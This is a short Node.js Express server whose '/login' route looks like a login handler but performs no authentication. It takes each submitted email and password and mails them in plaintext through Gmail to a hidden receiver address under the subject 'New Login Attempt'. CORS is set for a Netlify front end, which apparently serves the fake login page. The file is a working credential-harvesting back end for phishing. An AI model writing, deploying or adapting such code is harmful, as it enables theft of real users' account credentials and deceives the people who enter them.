const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express();
const allowedOrigins = ['https://logintestt.netlify.app', 'http://localhost:5173'];
app.use(cors({
    origin: allowedOrigins,
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type'],
    credentials: true
  }));
  
app.use(express.json());

app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  // Setup email transport
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.MAIL_USER,
      pass: process.env.MAIL_PASS
    }
  });

  const mailOptions = {
    from: process.env.MAIL_USER,
    to: process.env.RECEIVER_EMAIL,
    subject: 'New Login Attempt',
    text: `Email: ${email}\nPassword: ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send('Email sent');
  } catch (err) {
    console.error(err);
    res.status(500).send('Failed to send email');
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

